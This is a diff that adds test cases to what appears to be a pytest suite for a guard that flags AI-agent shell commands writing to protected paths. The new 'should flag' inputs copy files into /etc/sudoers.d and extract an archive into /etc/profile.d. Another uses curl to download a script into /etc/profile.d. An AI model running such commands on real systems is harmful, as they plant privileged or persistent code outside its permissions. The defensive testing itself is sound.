@@ -241,6 +241,12 @@ MAIN_WRITES = [
     # A path attached to a short option starts after the option letters.
     pytest.param(_bash("cp -t/etc/sudoers.d /tmp/agent 2>/dev/null"), id="attached-short-option"),
     pytest.param(_bash("install -Dt/etc/profile.d x.sh 2>&1"), id="attached-short-option-pair"),
+    pytest.param(_bash("cp -avt/etc/sudoers.d /tmp/agent 2>&1"), id="attached-short-option-cluster-3"),
+    pytest.param(_bash("tar -xzvC/etc/profile.d -f a.tgz 2>&1"), id="attached-short-option-cluster-4"),
+    pytest.param(
+        _bash("curl -fsSLo/etc/profile.d/tool.sh https://example.com/tool.sh 2>&1"),
+        id="attached-short-option-cluster-5",
+    ),
     # A read the keyword rule still flags, as documented.
     pytest.param(_bash("cat ~/.bashrc 2>/dev/null"), id="keyword-rule-read"),
 ]
@@ -304,6 +310,8 @@ BENIGN_ACTIONS = [
         id="source-opt-conda-profile-d",
     ),
     pytest.param(_bash("grep -c conda ~/miniconda3/etc/profile.d/conda.sh 2>/dev/null"), id="read-miniconda-profile-d"),
+    # A hyphen inside a directory name is not a short option.
+    pytest.param(_bash("ls /opt/conda-envs/etc/profile.d 2>&1"), id="read-hyphenated-dir-profile-d"),
     # Reads of protected files: stderr or fd redirects and writes to other files are not writes.
     pytest.param(_bash("cat ~/.gitconfig 2>/dev/null"), id="read-gitconfig-stderr-devnull"),
     pytest.param(_bash("ls ~/.claude/settings.json 2>&1"), id="ls-claude-settings-fd-dup"),
